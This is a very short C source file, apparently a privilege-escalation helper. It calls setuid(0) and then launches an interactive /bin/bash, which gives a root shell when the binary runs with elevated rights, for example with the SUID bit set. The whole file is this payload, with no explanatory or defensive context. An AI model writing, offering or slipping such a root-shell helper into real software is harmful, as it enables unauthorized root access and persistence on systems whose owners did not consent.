#include <unistd.h>
int main() {
    setuid(0);
    execl("/bin/bash", "/bin/bash", "-i", NULL);
}
